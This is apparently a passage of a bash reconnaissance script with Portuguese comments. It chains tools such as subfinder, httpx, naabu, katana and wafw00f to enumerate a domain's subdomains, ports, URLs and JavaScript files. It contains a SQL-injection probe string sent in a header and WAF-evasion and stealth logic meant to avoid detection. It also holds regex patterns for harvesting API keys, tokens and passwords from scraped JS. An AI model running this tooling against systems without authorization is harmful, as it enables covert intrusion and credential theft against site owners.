      git clone -q --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists >> "$_ilog" 2>&1 \
        && _iok "SecLists clonado via git" || _ierr "SecLists git falhou"
    fi
  else
    _iok "SecLists já presente em /usr/share/seclists"
  fi

  # ── Resumo ────────────────────────────────────────────────────
  echo
  echo -e "${BOLD}${LCYAN}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${LCYAN}  INSTALAÇÃO CONCLUÍDA — RESUMO DE FERRAMENTAS${NC}"
  echo -e "${BOLD}${LCYAN}══════════════════════════════════════════════════════${NC}"
  echo
  local _all=(subfinder httpx waybackurls gau katana gf qsreplace dalfox nuclei interactsh-client gowitness naabu subzy ffuf assetfinder sqlmap uro arjun wafw00f ghauri trufflehog)
  local _ok=0 _fail=0
  for _t in "${_all[@]}"; do
    if command -v "$_t" &>/dev/null; then
      echo -e "  ${LGREEN}✔${NC} $_t → $(command -v "$_t")"
      _ok=$(( _ok + 1 ))
    else
      echo -e "  ${LRED}✘${NC} $_t → não encontrado"
      _fail=$(( _fail + 1 ))
    fi
  done
  echo
  echo -e "  ${BOLD}Log completo:${NC}  ${CYAN}$_ilog${NC}"
  echo -e "  ${BOLD}Instalados:${NC}    ${LGREEN}$_ok${NC} / $(( _ok + _fail ))"
  [[ $_fail -gt 0 ]] && echo -e "  ${BOLD}Com falha:${NC}     ${LRED}$_fail${NC} — verifique o log"
  echo
  echo -e "  ${DIM}Se ferramentas Go não estiverem no PATH, adicione ao ~/.bashrc:${NC}"
  echo -e "  ${CYAN}  export PATH=\$PATH:\$HOME/go/bin${NC}"
  echo
  exit 0
}

# ============================================================
# FEATURE 1 — INTELIGÊNCIA ADAPTATIVA
# Após WAF detection, adapta automaticamente toda a estratégia
# de scan: delays, jitter, mutation, tampers, scan_profile
# ============================================================
adapt_to_waf() {
  [[ "$adaptive_mode" != "true" ]] && return
  [[ "${WAF_DETECTED:-false}" != "true" ]] && return

  local waf_type
  waf_type=$(grep -oiE "Cloudflare|Akamai|Imperva|ModSecurity|Fortinet|F5|Sucuri|Barracuda" \
    "$DIR_EXTRA/waf_detected.txt" 2>/dev/null | head -1 | tr '[:upper:]' '[:lower:]')

  warn "🧠 Inteligência Adaptativa ativada — WAF: ${waf_type:-unknown}"

  # Ativa jitter automático
  jitter_mode=true

  # Ajusta delay de burst entre grupos de requests
  case "$waf_type" in
    cloudflare|akamai|imperva)
      curl_delay=2
      burst_pause=5
      max_dalfox_workers=5
      scan_profile="stealth"
      ;;
    modsecurity|fortinet|f5|barracuda)
      curl_delay=1
      burst_pause=3
      max_dalfox_workers=10
      scan_profile="stealth"
      ;;
    *)
      curl_delay=1
      burst_pause=2
      scan_profile="stealth"
      ;;
  esac

  # Reduz limites para não disparar rate-limits
  [[ "$limit_cors"     -gt 20 ]] && limit_cors=20
  [[ "$limit_headers"  -gt 15 ]] && limit_headers=15
  [[ "$limit_sensitive" -gt 10 ]] && limit_sensitive=10
  [[ "$limit_lfi"      -gt 15 ]] && limit_lfi=15
  [[ "$limit_redirect" -gt 15 ]] && limit_redirect=15
  [[ "$limit_idor"     -gt 15 ]] && limit_idor=15
  [[ "$limit_crlf"     -gt 15 ]] && limit_crlf=15
  [[ "$max_sqli"       -gt 15 ]] && max_sqli=15
  [[ "$limit_xss_manual" -gt 25 ]] && limit_xss_manual=25

  # Força WAF evasion se estava desativada
  waf_evasion=true

  info "Perfil adaptado → stealth: curl_delay=${curl_delay}s, burst_pause=${burst_pause}s, jitter=ON, evasion=ON"
  echo "[ADAPTIVE] WAF=$waf_type scan_profile=stealth curl_delay=$curl_delay burst_pause=$burst_pause" \
    >> "$DIR_EXTRA/waf_detected.txt"
}

# burst_sleep: pausa entre grupos de requests quando WAF detectado
burst_sleep() {
  [[ "${burst_pause:-0}" -gt 0 ]] && sleep "$burst_pause"
}

# ============================================================
# FEATURE 2 — ENDPOINT SCORING (priorização inteligente)
# Atribui score de risco a cada URL e reordena targets
# Fatores: params sensíveis, paths de admin/api, extensões
# ============================================================

# score_endpoint URL → imprime score (inteiro)
score_endpoint() {
  local url="$1"
  local score=0

  # Params de alto risco
  echo "$url" | grep -qiE '[?&](id|user_id|uid|account|admin|token|key|secret|pass|auth|session|debug|cmd|exec|file|path|redirect|url|next|to|src|dest|data|load|include|require|page|template)=' && score=$(( score + 30 ))

  # Admin / painel / cms
  echo "$url" | grep -qiE '/(admin|dashboard|panel|manager|backend|cms|phpmyadmin|wp-admin|cpanel|portal|internal|staff|console)' && score=$(( score + 25 ))

  # API / GraphQL
  echo "$url" | grep -qiE '/(api|graphql|v[0-9]+|rest|rpc|soap|service)' && score=$(( score + 20 ))

  # Extensões de alto risco
  echo "$url" | grep -qiE '\.(php|asp|aspx|jsp|cfm|cgi|pl)(\?|$)' && score=$(( score + 15 ))

  # Múltiplos parâmetros (superficie maior)
  local param_count
  param_count=$(echo "$url" | grep -oE '[?&][^=&]+=' | wc -l)
  score=$(( score + param_count * 5 ))

  # Palavras-chave de dados sensíveis
  echo "$url" | grep -qiE '(login|auth|signup|register|password|reset|forgot|pay|billing|checkout|invoice|order|user|account|profile|settings|config|upload|download|export|import|report|search|query)' && score=$(( score + 10 ))

  # Upload / file handling
  echo "$url" | grep -qiE '(upload|file|attach|document|image|pdf|import|export)' && score=$(( score + 15 ))

  echo "$score"
}

# prioritize_targets INFILE OUTFILE
# Reordena URLs por score de risco (maior primeiro)
# Também aplica noise_reduction (shuffle dentro de grupos de risco igual)
prioritize_targets() {
  local infile="$1" outfile="$2"

  [[ ! -f "$infile" ]] && touch "$outfile" && return

  if [[ "$endpoint_scoring" != "true" ]]; then
    cp "$infile" "$outfile"
    return
  fi

  local tmpf
  tmpf=$(mktemp)

  while IFS= read -r url; do
    local s
    s=$(score_endpoint "$url")
    printf '%05d\t%s\n' "$s" "$url"
  done < "$infile" | sort -rn | awk -F'\t' '{print $2}' > "$tmpf"

  # noise_reduction: embaralha URLs com mesmo score vizinho para evitar
  # padrões sequenciais detectáveis (mesmo host sendo testado em sequência)
  if [[ "$noise_reduction" == "true" ]]; then
    # Agrupa por host + embaralha dentro de cada grupo de score
    python3 - "$tmpf" > "$outfile" 2>/dev/null <<'PYEOF' || cp "$tmpf" "$outfile"
import sys, random
lines = open(sys.argv[1]).read().splitlines()
# Divide em chunks de 10 e embaralha dentro de cada chunk
chunk_size = 10
chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]
result = []
for chunk in chunks:
    random.shuffle(chunk)
    result.extend(chunk)
print('\n'.join(result))
PYEOF
  else
    cp "$tmpf" "$outfile"
  fi
  rm -f "$tmpf"
  info "Scoring: $(wc -l < "$outfile") endpoints priorizados por risco"
}

# ============================================================
# FEATURE 3 — RECON PASSIVO: crt.sh, ASN, BGP, Shodan
# Intel externa para descoberta de ativos sem tocar o alvo
# ============================================================
step_passive_intel() {
  [[ "$passive_intel" != "true" ]] && return
  section "00b / PASSIVE INTEL (cert transparency, ASN, BGP)"

  mkdir -p "$DIR_DISC/passive"
  local passive_subs="$DIR_DISC/passive/passive_subs.txt"
  touch "$passive_subs"

  # ── crt.sh — Certificate Transparency ─────────────────────
  log "Consultando crt.sh (Certificate Transparency)..."
  local crt_result
  crt_result=$(retry_curl /dev/null \
    "https://crt.sh/?q=%25.${domain}&output=json" \
    -H "Accept: application/json" 2>/dev/null) || true

  if [[ -n "$crt_result" ]] && echo "$crt_result" | grep -q "name_value"; then
    echo "$crt_result" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    names = set()
    for entry in data:
        for name in entry.get('name_value', '').splitlines():
            name = name.strip().lstrip('*.')
            if name and '.' in name:
                names.add(name.lower())
    print('\n'.join(sorted(names)))
except: pass
" 2>/dev/null >> "$passive_subs" || true

    local crt_count
    crt_count=$(sort -u "$passive_subs" | wc -l)
    success "crt.sh: $crt_count subdomínios via cert transparency"
  else
    warn "crt.sh: sem resposta ou domínio não encontrado"
  fi

  # ── HackerTarget — Subdomain API ───────────────────────────
  log "Consultando HackerTarget API..."
  local ht_result
  ht_result=$(retry_curl /dev/null \
    "https://api.hackertarget.com/hostsearch/?q=${domain}" 2>/dev/null) || true

  if [[ -n "$ht_result" ]] && ! echo "$ht_result" | grep -qi "error\|API count"; then
    echo "$ht_result" | awk -F',' '{print $1}' | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" \
      >> "$passive_subs" 2>/dev/null || true
    success "HackerTarget: $(echo "$ht_result" | wc -l) registros"
  else
    warn "HackerTarget: limite de API atingido ou erro"
  fi

  # ── AlienVault OTX — Passive DNS ──────────────────────────
  log "Consultando AlienVault OTX passive DNS..."
  local otx_result
  otx_result=$(retry_curl /dev/null \
    "https://otx.alienvault.com/api/v1/indicators/domain/${domain}/passive_dns" \
    -H "Accept: application/json" 2>/dev/null) || true

  if [[ -n "$otx_result" ]] && echo "$otx_result" | grep -q "passive_dns"; then
    echo "$otx_result" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for entry in data.get('passive_dns', []):
        h = entry.get('hostname', '')
        if h and '.' in h and not h.startswith('*'):
            print(h.lower())
except: pass
" 2>/dev/null >> "$passive_subs" || true
    success "AlienVault OTX: passive DNS coletado"
  else
    warn "AlienVault OTX: sem dados"
  fi

  # ── BGP / ASN lookup ──────────────────────────────────────
  log "Buscando ASN e IPs relacionados ao domínio..."
  local asn_file="$DIR_DISC/passive/asn_info.txt"
  touch "$asn_file"

  local ip_result
  ip_result=$(retry_curl /dev/null \
    "https://api.hackertarget.com/dnslookup/?q=${domain}" 2>/dev/null) || true

  if [[ -n "$ip_result" ]] && ! echo "$ip_result" | grep -qi "error"; then
    echo "$ip_result" > "$asn_file"
    local main_ip
    main_ip=$(echo "$ip_result" | grep "A " | awk '{print $NF}' | head -1)

    if [[ -n "$main_ip" ]]; then
      info "IP principal: $main_ip"
      # ASN lookup via bgp.he.net (sem autenticação)
      local asn_info
      asn_info=$(retry_curl /dev/null \
        "https://api.hackertarget.com/aslookup/?q=${main_ip}" 2>/dev/null) || true
      [[ -n "$asn_info" ]] && echo "ASN: $asn_info" >> "$asn_file" && info "ASN: $asn_info"

      # IP range via WHOIS API
      local ipwhois
      ipwhois=$(retry_curl /dev/null \
        "https://api.hackertarget.com/whois/?q=${main_ip}" 2>/dev/null) || true
      if [[ -n "$ipwhois" ]]; then
        echo "$ipwhois" >> "$asn_file"
        # Extrai org name para contexto
        local org
        org=$(echo "$ipwhois" | grep -iE "^(OrgName|org-name|owner):" | head -1)
        [[ -n "$org" ]] && info "Organização: $org"
      fi
    fi
  fi

  # ── Shodan (opcional — requer --shodan-key) ────────────────
  if [[ -n "$shodan_api_key" ]]; then
    log "Consultando Shodan (recon passivo de IP/porta)..."
    local shodan_file="$DIR_DISC/passive/shodan.txt"
    local shodan_result
    shodan_result=$(retry_curl /dev/null \
      "https://api.shodan.io/dns/domain/${domain}?key=${shodan_api_key}" \
      -H "Accept: application/json" 2>/dev/null) || true

    if [[ -n "$shodan_result" ]] && echo "$shodan_result" | grep -q "subdomains"; then
      echo "$shodan_result" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    domain = d.get('domain', '')
    for sub in d.get('subdomains', []):
        print(f'{sub}.{domain}'.lower())
except: pass
" 2>/dev/null >> "$passive_subs" || true
      echo "$shodan_result" > "$shodan_file"
      success "Shodan DNS: coletado"
    else
      warn "Shodan: sem resultado (key inválida ou domínio não indexado)"
    fi
  fi

  # ── Consolida e deduplica subdomínios passivos ─────────────
  sort -u "$passive_subs" | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" \
    | grep -F ".$domain" > "$DIR_DISC/passive/passive_subs_clean.txt" 2>/dev/null || true

  local passive_total
  passive_total=$(wc -l < "$DIR_DISC/passive/passive_subs_clean.txt" 2>/dev/null || echo 0)
  success "Total subdomínios via passive intel: $passive_total"

  # Integra ao pipeline principal
  if [[ -s "$DIR_DISC/passive/passive_subs_clean.txt" ]]; then
    cat "$DIR_DISC/passive/passive_subs_clean.txt" >> "$DIR_DISC/subs_all.txt"
    sort -u "$DIR_DISC/subs_all.txt" -o "$DIR_DISC/subs_all.txt"
    success "Passive intel integrado → subs_all.txt agora tem $(wc -l < "$DIR_DISC/subs_all.txt") subdomínios únicos"
  fi
}

# ============================================================
# CHECK DEPENDENCIES
# ============================================================
check_deps() {
  section "VERIFICANDO DEPENDÊNCIAS"

  # v1.0: Garante $HOME/go/bin no PATH (ferramentas Go instaladas pelo usuário)
  export GOPATH="${GOPATH:-$HOME/go}"
  export PATH="$PATH:$GOPATH/bin:/usr/local/go/bin"

  local required=(subfinder httpx waybackurls gau katana gf uro qsreplace dalfox nuclei sqlmap)
  local optional=(gowitness naabu subzy arjun ffuf trufflehog assetfinder amass findomain ghauri wafw00f interactsh-client python3)
  local missing_required=()

  for tool in "${required[@]}"; do
    if command -v "$tool" &>/dev/null; then
      success "$tool → $(command -v "$tool")"
    else
      error "$tool → NÃO ENCONTRADO"
      missing_required+=("$tool")
    fi
  done

  echo | tee -a "$log_file"

  for tool in "${optional[@]}"; do
    if command -v "$tool" &>/dev/null; then
      info "$tool (opcional) → $(command -v "$tool")"
    else
      warn "$tool (opcional) → não encontrado"
    fi
  done

  if [[ ${#missing_required[@]} -gt 0 ]]; then
    echo
    error "Ferramentas obrigatórias ausentes: ${missing_required[*]}"
    echo
    warn "  → Use './recon.sh --install' para instalar TUDO automaticamente"
    echo
    echo -e "  ${BOLD}Ou instale manualmente:${NC}"
    echo -e "  ${DIM}  go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest${NC}"
    echo -e "  ${DIM}  go install github.com/projectdiscovery/httpx/cmd/httpx@latest${NC}"
    echo -e "  ${DIM}  go install github.com/tomnomnom/waybackurls@latest${NC}"
    echo -e "  ${DIM}  go install github.com/lc/gau/v2/cmd/gau@latest${NC}"
    echo -e "  ${DIM}  go install github.com/projectdiscovery/katana/cmd/katana@latest${NC}"
    echo -e "  ${DIM}  go install github.com/tomnomnom/gf@latest${NC}"
    echo -e "  ${DIM}  go install github.com/tomnomnom/qsreplace@latest${NC}"
    echo -e "  ${DIM}  go install github.com/hahwul/dalfox/v2@latest${NC}"
    echo -e "  ${DIM}  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest${NC}"
    echo -e "  ${DIM}  pip install uro arjun wafw00f --break-system-packages${NC}"
    echo -e "  ${DIM}  sudo apt install sqlmap${NC}"
    echo
    exit 1
  fi

  command -v gowitness         &>/dev/null && HAS_GOWITNESS=true
  command -v naabu             &>/dev/null && HAS_NAABU=true
  command -v subzy             &>/dev/null && HAS_SUBZY=true
  command -v arjun             &>/dev/null && HAS_ARJUN=true
  command -v ffuf              &>/dev/null && HAS_FFUF=true
  command -v trufflehog        &>/dev/null && HAS_TRUFFLEHOG=true
  command -v assetfinder       &>/dev/null && HAS_ASSETFINDER=true
  command -v amass             &>/dev/null && HAS_AMASS=true
  command -v findomain         &>/dev/null && HAS_FINDOMAIN=true
  command -v ghauri            &>/dev/null && HAS_GHAURI=true
  command -v wafw00f           &>/dev/null && HAS_WAFW00F=true
  command -v interactsh-client &>/dev/null && HAS_INTERACTSH=true
  command -v python3           &>/dev/null && HAS_PYTHON3=true

  success "Todas as dependências obrigatórias OK"
}

# ============================================================
# 01 — SUBDOMAIN ENUMERATION
# ============================================================
step_subdomains() {
  section "01 / ENUMERAÇÃO DE SUBDOMÍNIOS"

  local subfinder_args=(-d "$domain" -silent)
  [[ "$deep_mode" == "true" ]] && subfinder_args+=(-all)

  log "Rodando subfinder..."
  subfinder "${subfinder_args[@]}" 2>>"$error_log" \
    | sort -u > "$DIR_DISC/subs_subfinder.txt"
  success "subfinder: $(count "$DIR_DISC/subs_subfinder.txt") subdomínios"

  if [[ "$HAS_ASSETFINDER" == "true" ]]; then
    log "Rodando assetfinder..."
    assetfinder --subs-only "$domain" 2>>"$error_log" \
      | sort -u > "$DIR_DISC/subs_assetfinder.txt"
    success "assetfinder: $(count "$DIR_DISC/subs_assetfinder.txt") subdomínios"
  else
    touch "$DIR_DISC/subs_assetfinder.txt"
  fi

  if [[ "$HAS_FINDOMAIN" == "true" ]]; then
    log "Rodando findomain..."
    findomain -t "$domain" -q 2>>"$error_log" \
      | sort -u > "$DIR_DISC/subs_findomain.txt"
    success "findomain: $(count "$DIR_DISC/subs_findomain.txt") subdomínios"
  else
    touch "$DIR_DISC/subs_findomain.txt"
  fi

  if [[ "$HAS_AMASS" == "true" ]]; then
    log "Rodando amass (passive)..."
    local amass_args=(-passive -d "$domain" -silent)
    [[ "$deep_mode" == "true" ]] && amass_args=(-d "$domain" -silent)
    amass enum "${amass_args[@]}" 2>>"$error_log" \
      | sort -u > "$DIR_DISC/subs_amass.txt"
    success "amass: $(count "$DIR_DISC/subs_amass.txt") subdomínios"
  else
    touch "$DIR_DISC/subs_amass.txt"
  fi

  cat \
    "$DIR_DISC/subs_subfinder.txt" \
    "$DIR_DISC/subs_assetfinder.txt" \
    "$DIR_DISC/subs_findomain.txt" \
    "$DIR_DISC/subs_amass.txt" \
    2>/dev/null | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" | sort -u \
    > "$DIR_DISC/subs_all.txt"

  success "Total subdomínios únicos: $(count "$DIR_DISC/subs_all.txt")"
}

# ============================================================
# 02 — ALIVE CHECK
# ============================================================
step_alive() {
  section "02 / VERIFICAÇÃO DE HOSTS ATIVOS"

  log "Rodando httpx..."
  httpx \
    -l "$DIR_DISC/subs_all.txt" \
    -silent \
    -threads "$threads" \
    -status-code \
    -title \
    -tech-detect \
    -content-length \
    -follow-redirects \
    -o "$DIR_DISC/alive_detailed.txt" 2>>"$error_log"

  awk '{print $1}' "$DIR_DISC/alive_detailed.txt" | sort -u > "$DIR_DISC/alive.txt"
  success "Hosts ativos: $(count "$DIR_DISC/alive.txt")"

  grep '\[200\]'                   "$DIR_DISC/alive_detailed.txt" > "$DIR_DISC/alive_200.txt"      2>/dev/null || touch "$DIR_DISC/alive_200.txt"
  grep -E '\[(301|302|307|308)\]'  "$DIR_DISC/alive_detailed.txt" > "$DIR_DISC/alive_redirect.txt" 2>/dev/null || touch "$DIR_DISC/alive_redirect.txt"
  grep '\[403\]'                   "$DIR_DISC/alive_detailed.txt" > "$DIR_DISC/alive_403.txt"      2>/dev/null || touch "$DIR_DISC/alive_403.txt"
  grep '\[401\]'                   "$DIR_DISC/alive_detailed.txt" > "$DIR_DISC/alive_401.txt"      2>/dev/null || touch "$DIR_DISC/alive_401.txt"
  grep -E '\[(500|502|503)\]'      "$DIR_DISC/alive_detailed.txt" > "$DIR_DISC/alive_5xx.txt"      2>/dev/null || touch "$DIR_DISC/alive_5xx.txt"

  info "200 OK       : $(count "$DIR_DISC/alive_200.txt")"
  info "Redirects    : $(count "$DIR_DISC/alive_redirect.txt")"
  info "403 Forbidden: $(count "$DIR_DISC/alive_403.txt")"
  info "401 Unauth   : $(count "$DIR_DISC/alive_401.txt")"
  info "5xx Errors   : $(count "$DIR_DISC/alive_5xx.txt")"

  awk '{$1=""; print}' "$DIR_DISC/alive_detailed.txt" \
    | grep -oP '\[[^\[\]]+\]' \
    | grep -vE '^\[([0-9]{3}|[0-9]+ [a-zA-Z]+|[0-9]+B?)\]' \
    | tr -d '[]' | sort | uniq -c | sort -rn \
    > "$DIR_EXTRA/technologies.txt" 2>/dev/null || touch "$DIR_EXTRA/technologies.txt"

  info "Tecnologias mapeadas: $(count "$DIR_EXTRA/technologies.txt")"
}

# ============================================================
# 03 — PORT SCAN
# ============================================================
step_ports() {
  section "03 / PORT SCAN"

  if [[ "$HAS_NAABU" != "true" ]]; then
    warn "naabu não encontrado — pulando port scan"
    touch "$DIR_DISC/ports.txt" "$DIR_DISC/ports_interesting.txt"
    return
  fi

  log "Rodando naabu (top 1000 portas)..."
  naabu \
    -l "$DIR_DISC/alive.txt" \
    -top-ports 1000 \
    -silent \
    -threads "$threads" \
    -o "$DIR_DISC/ports.txt" 2>>"$error_log" || touch "$DIR_DISC/ports.txt"

  success "Portas encontradas: $(count "$DIR_DISC/ports.txt")"

  grep -E ':(8080|8443|8888|9090|3000|5000|4000|7000|8000|9200|6379|27017|5432|3306|2375|4848|9000)$' \
    "$DIR_DISC/ports.txt" > "$DIR_DISC/ports_interesting.txt" 2>/dev/null || touch "$DIR_DISC/ports_interesting.txt"

  info "Portas interessantes: $(count "$DIR_DISC/ports_interesting.txt")"
}

# ============================================================
# 04 — SCREENSHOTS
# ============================================================
step_screenshots() {
  section "04 / SCREENSHOTS"

  if [[ "$skip_screenshots" == "true" ]]; then
    warn "Screenshots desativados via --no-screenshots"
    return
  fi

  if [[ "$HAS_GOWITNESS" != "true" ]]; then
    warn "gowitness não encontrado — pulando"
    return
  fi

  log "Capturando screenshots com gowitness v3..."
  gowitness \
    --screenshot-path "$DIR_SHOTS" \
    -t "$threads" \
    -T "$timeout" \
    --write-none \
    scan file \
    -f "$DIR_DISC/alive.txt" \
    2>>"$error_log" || true

  local shot_count
  shot_count=$(find "$DIR_SHOTS" -name "*.png" -o -name "*.jpeg" 2>/dev/null | wc -l)
  success "Screenshots: $shot_count"
}

# ============================================================
# 05 — SUBDOMAIN TAKEOVER
# ============================================================
step_takeover() {
  section "05 / SUBDOMAIN TAKEOVER CHECK"

  if [[ "$HAS_SUBZY" != "true" ]]; then
    warn "subzy não encontrado — pulando"
    touch "$DIR_EXTRA/takeover.txt"
    return
  fi

  log "Verificando subdomain takeover com subzy..."
  subzy run \
    --targets "$DIR_DISC/subs_all.txt" \
    --output "$DIR_EXTRA/takeover.txt" \
    --hide_fails \
    2>>"$error_log" || true

  success "Takeover check: $(count "$DIR_EXTRA/takeover.txt") vulneráveis"
}

# ============================================================
# 06 — URL COLLECTION
# ============================================================
step_urls() {
  section "06 / COLETA DE URLs"

  sed 's|https\?://||g; s|/.*||g' "$DIR_DISC/alive.txt" | sort -u > "$DIR_DISC/subs_clean.txt"

  log "Wayback Machine..."
  cat "$DIR_DISC/subs_clean.txt" | waybackurls 2>>"$error_log" \
    | sort -u > "$DIR_URLS/wayback.txt"
  success "waybackurls: $(count "$DIR_URLS/wayback.txt") URLs"

  log "GAU..."
  gau \
    --subs "$domain" \
    --threads "$gau_threads" \
    --blacklist png,jpg,gif,jpeg,ico,css,woff,woff2,ttf,svg \
    2>>"$error_log" | sort -u > "$DIR_URLS/gau.txt"
  success "gau: $(count "$DIR_URLS/gau.txt") URLs"

  log "Katana (crawl ativo, profundidade $katana_depth)..."
  katana \
    -list "$DIR_DISC/alive.txt" \
    -silent \
    -jc \
    -kf all \
    -d "$katana_depth" \
    -aff \
    -c "$threads" \
    -timeout "$timeout" \
    2>>"$error_log" | sort -u > "$DIR_URLS/katana.txt"
  success "katana: $(count "$DIR_URLS/katana.txt") URLs"

  cat "$DIR_URLS/wayback.txt" \
      "$DIR_URLS/gau.txt" \
      "$DIR_URLS/katana.txt" \
    | sort -u > "$DIR_URLS/urls_all.txt"

  success "Total URLs únicas: $(count "$DIR_URLS/urls_all.txt")"
}

# ============================================================
# 07 — URL FILTERING
# ============================================================
step_filter_urls() {
  section "07 / FILTRAGEM E CATEGORIZAÇÃO DE URLs"

  grep -Eiv "\.(jpg|jpeg|png|gif|bmp|css|svg|woff|woff2|ttf|eot|ico|mp4|mp3|pdf|zip|rar|gz|tar|7z|exe|dmg|apk|webp|tiff|otf|flv|swf|map)" \
    "$DIR_URLS/urls_all.txt" > "$DIR_URLS/urls_clean.txt"
  success "URLs limpas: $(count "$DIR_URLS/urls_clean.txt")"

  grep -iE "\.php"            "$DIR_URLS/urls_clean.txt" | sort -u > "$DIR_URLS/urls_php.txt"
  grep -iE "\.(asp|aspx)"     "$DIR_URLS/urls_clean.txt" | sort -u > "$DIR_URLS/urls_asp.txt"
  grep -iE "(api|graphql|v[0-9]|rest|json|xml)" "$DIR_URLS/urls_clean.txt" | sort -u > "$DIR_URLS/urls_api.txt"
  grep -iE "(admin|painel|panel|login|dashboard|manager|backend|cms|wp-admin|phpmyadmin|cpanel|portal)" \
    "$DIR_URLS/urls_clean.txt" | sort -u > "$DIR_URLS/urls_admin.txt"
  grep -iE "\.(bak|old|backup|sql|db|conf|config|env|log|xml|yaml|yml|ini|key|pem|crt)($|\?)" \
    "$DIR_URLS/urls_all.txt" | sort -u > "$DIR_URLS/urls_sensitive.txt"
  grep -iE "\.js($|\?)"       "$DIR_URLS/urls_all.txt"   | sort -u > "$DIR_JS/js_files.txt"

  info "PHP      : $(count "$DIR_URLS/urls_php.txt")"
  info "ASP/ASPX : $(count "$DIR_URLS/urls_asp.txt")"
  info "API      : $(count "$DIR_URLS/urls_api.txt")"
  info "Admin    : $(count "$DIR_URLS/urls_admin.txt")"
  info "Sensíveis: $(count "$DIR_URLS/urls_sensitive.txt")"
  info "JS       : $(count "$DIR_JS/js_files.txt")"
}

# ============================================================
# 07b — WAF DETECTION
# FIX v5.0: usa limit_waf em vez de head -n 10 / head -n 20 hardcoded
# ============================================================
step_waf_detect() {
  section "07b / WAF DETECTION"

  if is_empty "$DIR_DISC/alive.txt"; then
    warn "Sem hosts ativos para WAF detection"
    return
  fi

  touch "$DIR_EXTRA/waf_detected.txt"

  if [[ "$HAS_WAFW00F" == "true" ]]; then
    log "Rodando wafw00f nos primeiros $limit_waf hosts ativos..."
    while IFS= read -r url; do
      local result
      result=$(wafw00f "$url" 2>>"$error_log" | grep -iE "(detected|is behind)" || true)
      if [[ -n "$result" ]]; then
        echo "$url → $result" | tee -a "$DIR_EXTRA/waf_detected.txt" | tee -a "$log_file"
      fi
    done < <(head -n "$limit_waf" "$DIR_DISC/alive.txt")
  fi

  log "Detecção de WAF via fingerprint manual (primeiros $limit_waf hosts)..."
  while IFS= read -r url; do
    local resp
    resp=$(curl -sk --max-time "$timeout" -I \
      -H "X-Attack: 1 OR 1=1-- -" \
      "$url" 2>/dev/null)

    local waf_name="unknown"
    echo "$resp" | grep -qi "cloudflare"              && waf_name="Cloudflare"
    echo "$resp" | grep -qi "akamai"                  && waf_name="Akamai"
    echo "$resp" | grep -qi "incapsula"               && waf_name="Imperva"
    echo "$resp" | grep -qi "sucuri"                  && waf_name="Sucuri"
    echo "$resp" | grep -qi "barracuda"               && waf_name="Barracuda"
    echo "$resp" | grep -qi "f5-bigip\|X-WA-Info"    && waf_name="F5"
    echo "$resp" | grep -qi "modsecurity\|mod_security" && waf_name="ModSecurity"
    echo "$resp" | grep -qi "fortigate"               && waf_name="Fortinet"

    if [[ "$waf_name" != "unknown" ]]; then
      warn "WAF detectado em $url → $waf_name"
      echo "$url | WAF=$waf_name" >> "$DIR_EXTRA/waf_detected.txt"
    fi
    curl_throttle
  done < <(head -n "$limit_waf" "$DIR_DISC/alive.txt")

  if ! is_empty "$DIR_EXTRA/waf_detected.txt"; then
    warn "WAF detectado em $(count "$DIR_EXTRA/waf_detected.txt") hosts"
    WAF_DETECTED=true
  else
    info "Nenhum WAF identificado"
    WAF_DETECTED=false
  fi
}

# ============================================================
# 08 — JS ANALYSIS
# ============================================================
step_js() {
  section "08 / ANÁLISE DE ARQUIVOS JS"

  if is_empty "$DIR_JS/js_files.txt"; then
    warn "Nenhum arquivo JS encontrado"
    touch "$DIR_JS/js_endpoints.txt" "$DIR_JS/js_secrets.txt"
    return
  fi

  local secret_patterns=(
    'api[_-]?key\s*[:=]\s*["'"'"'][a-zA-Z0-9_\-]{20,}'
    'secret[_-]?key\s*[:=]\s*["'"'"'][a-zA-Z0-9_\-]{20,}'
    'access[_-]?token\s*[:=]\s*["'"'"'][a-zA-Z0-9_.\-]{20,}'
    'password\s*[:=]\s*["'"'"'][^"'"'"']{8,}'
    'bearer\s+[a-zA-Z0-9_.\-]{20,}'
    'AKIA[0-9A-Z]{16}'
    'ASIA[0-9A-Z]{16}'
    'ghp_[a-zA-Z0-9]{36}'
    'ghs_[a-zA-Z0-9]{36}'
    'eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*'
    'AIza[0-9A-Za-z\-_]{35}'
    'sk-[a-zA-Z0-9]{40,}'
    'SG\.[a-zA-Z0-9_\-]{22,}\.[a-zA-Z0-9_\-]{43,}'
    'xox[baprs]-[0-9a-zA-Z]{10,}'
    'sk_live_[a-zA-Z0-9]{24,}'
    'pk_live_[a-zA-Z0-9]{24,}'
    'rk_live_[a-zA-Z0-9]{24,}'
  )

  log "Analisando JS: endpoints + secrets em $(head -n "$limit_js_endpoints" "$DIR_JS/js_files.txt" | wc -l) arquivos..."

  while IFS= read -r jsurl; do
    local content
    content=$(curl -sk --max-time "$timeout" "$jsurl" 2>>"$error_log")
    [[ -z "$content" ]] && curl_throttle && continue

    echo "$content" \
      | grep -oE "(https?://[^\"\\'> ]+|/[a-zA-Z0-9_/.-]{3,})" \
      | grep -v "^//$" \
      >> "$DIR_JS/js_endpoints_raw.txt" 2>/dev/null || true

    for pattern in "${secret_patterns[@]}"; do
      echo "$content" | grep -iE "$pattern" | while IFS= read -r match; do
        echo "[JS: $jsurl]  $match" >> "$DIR_JS/js_secrets.txt"
      done
    done

    curl_throttle
  done < <(head -n "$limit_js_endpoints" "$DIR_JS/js_files.txt")

  sort -u "$DIR_JS/js_endpoints_raw.txt" > "$DIR_JS/js_endpoints.txt" 2>/dev/null || touch "$DIR_JS/js_endpoints.txt"
  success "Endpoints extraídos de JS: $(count "$DIR_JS/js_endpoints.txt")"

  if ! is_empty "$DIR_JS/js_secrets.txt" 2>/dev/null; then
    success "Possíveis secrets em JS: $(count "$DIR_JS/js_secrets.txt")"
  else
    info "Nenhum secret encontrado em JS"
    touch "$DIR_JS/js_secrets.txt"
  fi

